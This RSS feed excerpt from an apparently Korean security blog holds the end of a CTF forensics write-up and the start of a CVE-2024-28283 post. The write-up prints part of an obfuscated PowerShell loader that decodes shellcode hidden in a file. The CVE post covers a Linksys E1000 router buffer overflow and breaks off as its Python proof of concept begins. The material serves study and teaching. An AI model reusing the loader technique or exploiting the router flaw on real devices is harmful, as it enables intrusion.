&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var28&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var27&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var25&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var29&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var26&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var25&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var30&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;V2VsY29tZQ==(Welcome)&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var31&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var32&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var32&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-lt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var29&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var33&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var25&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var32&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var34&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;U2NyaXB0IGhhcyBlbmRlZCBleGVjdXRpb24=(Script has ended execution)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var35&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;iex 뒤에 오는 데이터는 for문을 거쳐서 도출되는 것으로 보인다. 따라서, for문이 핵심부로 보인다.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kr&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var21&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var21&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;18304&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-bor&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$guide_fileData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var20&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$decoded_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var20&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;대상 파일(Guide.idb)의 첫 55번째 byte부터 18303byte까지 18249byte를 8 byte씩 끊어서 디코딩하는 것으로 보인다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%207.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;음? 그런데 Guide.idb는 7143000 byte이다.&lt;/p&gt;

&lt;p&gt;파일의 일부만 디코딩한 결과물이 쉘코드라는 것이니&lt;/p&gt;

&lt;p&gt;파일의 전체를 디코딩하면 뭐가 나오는지 한 번 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%208.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;파일의 전체를 디코딩하도록 루프 종료 조건을 수정한 모습&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%209.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;파일 전체가 디코딩된다면 아마 명령어로는 먹히지 못할 것이라, iex 대신 Write-Host 명령어를 사용하여 디코딩된 결과값이 콘솔에 찍히도록 수정한 모습&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%2010.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그 결과, 플래그를 획득할 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;FLAG: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FIESTA{h1dd3n_fl4g_y3ah}&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol class=&quot;notice&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-1&quot;&gt;FIESTA2024 S-4-1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-2&quot;&gt;FIESTA2024 S-4-2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-3&quot;&gt;FIESTA2024 S-4-3&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 28 Jan 2025 09:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-1</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-1</guid>
      </item>
    
      <item>
        <title>CVE-2024-28283 분석과 KARONTE fuzzer 활용</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#-문제&quot; id=&quot;markdown-toc--문제&quot;&gt;💯 문제&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#️-조건&quot; id=&quot;markdown-toc-️-조건&quot;&gt;✏️ 조건&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#0-접근법-설정&quot; id=&quot;markdown-toc-0-접근법-설정&quot;&gt;0. 접근법 설정&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#01-탐색-범위-좁히기&quot; id=&quot;markdown-toc-01-탐색-범위-좁히기&quot;&gt;0.1. 탐색 범위 좁히기&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#02-cve-2024-28283-조사&quot; id=&quot;markdown-toc-02-cve-2024-28283-조사&quot;&gt;0.2. CVE-2024-28283 조사&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#03-취약점-분석-보고서-원본-정리&quot; id=&quot;markdown-toc-03-취약점-분석-보고서-원본-정리&quot;&gt;0.3. 취약점 분석 보고서 원본 정리&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#031-취약점-원인&quot; id=&quot;markdown-toc-031-취약점-원인&quot;&gt;0.3.1. 취약점 원인&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#032-취약점-poc&quot; id=&quot;markdown-toc-032-취약점-poc&quot;&gt;0.3.2. 취약점 PoC&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#033-취약점-익스플로잇-결과&quot; id=&quot;markdown-toc-033-취약점-익스플로잇-결과&quot;&gt;0.3.3. 취약점 익스플로잇 결과&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-실-분석-수행&quot; id=&quot;markdown-toc-1-실-분석-수행&quot;&gt;1. 실 분석 수행&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#10-karonte를-활용한-분석&quot; id=&quot;markdown-toc-10-karonte를-활용한-분석&quot;&gt;1.0. KARONTE를 활용한 분석&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#100-펌웨어-분석은-어떻게-시작해야-하는가&quot; id=&quot;markdown-toc-100-펌웨어-분석은-어떻게-시작해야-하는가&quot;&gt;1.0.0. 펌웨어 분석은 어떻게 시작해야 하는가?&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#101-karonte-input-파인&quot; id=&quot;markdown-toc-101-karonte-input-파인&quot;&gt;1.0.1. KARONTE input 파인&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#102-unpack&quot; id=&quot;markdown-toc-102-unpack&quot;&gt;1.0.2. unpack&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#11-정적-분석&quot; id=&quot;markdown-toc-11-정적-분석&quot;&gt;1.1. 정적 분석&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#110-분석-대상-파일-찾기&quot; id=&quot;markdown-toc-110-분석-대상-파일-찾기&quot;&gt;1.1.0. 분석 대상 파일 찾기&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#111-분석&quot; id=&quot;markdown-toc-111-분석&quot;&gt;1.1.1. 분석&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#12-익스플로잇-환경-셋업&quot; id=&quot;markdown-toc-12-익스플로잇-환경-셋업&quot;&gt;1.2. 익스플로잇 환경 셋업&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#13-익스플로잇-설계&quot; id=&quot;markdown-toc-13-익스플로잇-설계&quot;&gt;1.3. 익스플로잇 설계&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#14-익스플로잇&quot; id=&quot;markdown-toc-14-익스플로잇&quot;&gt;1.4. 익스플로잇&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-익스플로잇을-통해-가능한-침해-시나리오&quot; id=&quot;markdown-toc-2-익스플로잇을-통해-가능한-침해-시나리오&quot;&gt;2. 익스플로잇을 통해 가능한 침해 시나리오&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-mitigation-제시&quot; id=&quot;markdown-toc-3-mitigation-제시&quot;&gt;3. Mitigation 제시&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;-문제&quot;&gt;💯 문제&lt;/h1&gt;

&lt;p class=&quot;notice&quot;&gt;주어진 펌웨어 내 실행 파일을 추출하여 분석하고, 어떤 1-day 취약점이 존재하는지 분석하라.&lt;/p&gt;

&lt;h3 id=&quot;️-조건&quot;&gt;✏️ 조건&lt;/h3&gt;

&lt;ul class=&quot;notice&quot;&gt;
  &lt;li&gt;E1000 라우터 펌웨어&lt;/li&gt;
  &lt;li&gt;실행파일 이름: httpd&lt;/li&gt;
  &lt;li&gt;사용자 입력 함수: get_cgi&lt;/li&gt;
  &lt;li&gt;취약점 종류: buffer overflow&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/FW_E1000_2.1.03.005_US_20140321.bin&quot;&gt;FW_E1000_2.1.03.005_US_20140321.bin&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0-접근법-설정&quot;&gt;0. 접근법 설정&lt;/h1&gt;

&lt;h2 id=&quot;01-탐색-범위-좁히기&quot;&gt;0.1. 탐색 범위 좁히기&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;1-day 취약점이 존재한다 → 이미 정보가 공개된 취약점&lt;/li&gt;
  &lt;li&gt;취약점의 정보가 공개되어 있다 → 높은 확률로 CVE를 받았다&lt;/li&gt;
  &lt;li&gt;위와 같은 취약점이 CVE 등록되었다면, 필수적으로 E1000 router, httpd 키워드가 description에 있을 것이다&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;따라서 검색해 보았음&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;CVE-2024-28283이 나왔고, 내부 description은 아래와 같았음&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;There is stack-based buffer overflow vulnerability in pc_change_act function in Linksys E1000 router firmware version v.2.1.03 and before, leading to remote code execution.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;내용만 읽어보면, 매우 높은 확률로 해당 CVE가 문제 취약점일 가능성이 높음.&lt;/p&gt;

&lt;p&gt;더 확실한 교차 검증을 위해 과제로 주어진 파일 버전을 확인함&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%201.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;정확히 일치하는 버전이기 때문에, 문제 취약점은 CVE-2024-28283인 것으로 가정하고 문제에 접근&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;02-cve-2024-28283-조사&quot;&gt;0.2. CVE-2024-28283 조사&lt;/h2&gt;

&lt;p&gt;NVD는 실제로 CVE가 등록되는 기관이 아니다.&lt;/p&gt;

&lt;p&gt;CNA가 운영규정에 따라 CVE를 등록하면 cve.org에 등록되는 형식이다. NVD는 이를 Pull 해서 NVD상에 넣고 관리하며 Assessment를 애초에 CVE가 CISA의 후원을 받고, NVD가 NIST에 의해 운영되며 NIST는 CISA와 함께 FISMA 집행을 위해 설립된 기관이므로, CVE와 NVD 둘 다 실질적으로 미 정부 산하기관으로 보면 되긴 하지만, 어쨌든 둘은 별개의 기관이다.&lt;/p&gt;

&lt;p&gt;즉, 더 정확하고 디테일한 정보를 보고 싶다면 cve.org에 올라온 CVE 정보를 보는 게 좋다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%202.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;저기 밑에 References로 나온 notion 페이지(&lt;a href=&quot;https://www.notion.so/37b98eec45ea4fc991b9b5bea3db091d?pvs=21&quot;&gt;https://d05004.notion.site/Linksys-E1000-BOF-37b98eec45ea4fc991b9b5bea3db091d&lt;/a&gt;)에 들어가면 해당 취약점 분석이 매우 상세하게 나와 있다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;03-취약점-분석-보고서-원본-정리&quot;&gt;0.3. 취약점 분석 보고서 원본 정리&lt;/h2&gt;

&lt;h3 id=&quot;031-취약점-원인&quot;&gt;0.3.1. 취약점 원인&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;원인은 BoF&lt;/li&gt;
  &lt;li&gt;BoF는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sprintf&lt;/code&gt; 함수 사용으로 인해 발생(sprintf 함수가 BoF에 취약한 함수로, 시큐어코딩 규약을 위반한 셈)&lt;/li&gt;
  &lt;li&gt;해당 함수는 타겟 펌웨어의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pc_change_act&lt;/code&gt; 함수 내부에 있음&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;032-취약점-poc&quot;&gt;0.3.2. 취약점 PoC&lt;/h3&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

